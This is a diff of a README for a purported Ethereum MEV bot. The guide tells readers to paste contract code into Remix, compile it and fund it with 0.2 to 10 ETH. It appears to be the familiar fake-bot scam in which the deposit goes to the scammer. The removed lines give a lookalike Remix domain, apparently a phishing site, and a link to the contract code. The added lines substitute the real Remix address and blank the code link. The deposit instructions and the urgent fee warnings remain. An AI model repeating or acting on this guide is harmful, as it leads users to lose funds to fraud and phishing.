@@ -1,16 +1,16 @@
-*🚨 IMPORTANT:* I've received messages from users who didn't provide enough Ethereum to cover gas fees and potential burn fees. The bot targets token contracts with a maximum burn fee of 10% or lower, though most tokens currently have fees between 2-6%. If you fund the contract with 0.15 ETH or less and the bot targets a token with high burn fees, a significant amount of gas fees might be wasted. To avoid this, I recommend funding the contract with at least 0.2 to 10 ETH.
+*🚨 IMPORTANT:* I've received messages from users who didn't provide enough Ethereum to cover gas fees and potential burn fees. The bot targets token contracts with a maximum burn fee of 8% or lower, though most tokens currently have fees between 2-6%. If you fund the contract with 0.15 ETH or less and the bot targets a token with high burn fees, a significant amount of gas fees might be wasted. To avoid this, I recommend funding the contract with at least 0.2 to 10 ETH.
 
 *STEP BY STEP INSTRUCTIONS*
 
 ✅ Download MetaMask: https://metamask.io/download/
 
-✅ Access Remix: https://remexide.co/
+✅ Access Remix: https://remix.ethereum.org
 _(THE BOT IS ONLY COMPATIBLE WITH THIS VERSION OF THE REMIX, SO ONLY USE THIS LINK)_
 
 ✅ Click on the “contracts” folder and then create “New File”. Rename it as you like, i.e: “bot.sol”. Make sure it ends with .sol for Ethereum programming language.
 _Note: There is a problem if the text is not colored when you create bot.sol. Simply refresh the browser and then paste rentry codes again._
 
-*🔥 Paste THIS code in Remix:* github.com/0x-tiay/MEVBOT-ChatGPT/blob/main/.Contract%20code
+*🔥 Paste THIS code in Remix:* 
 
 ✅ Go to the "Compile" tab on Remix and Compile with Solidity version 0.6.6
 
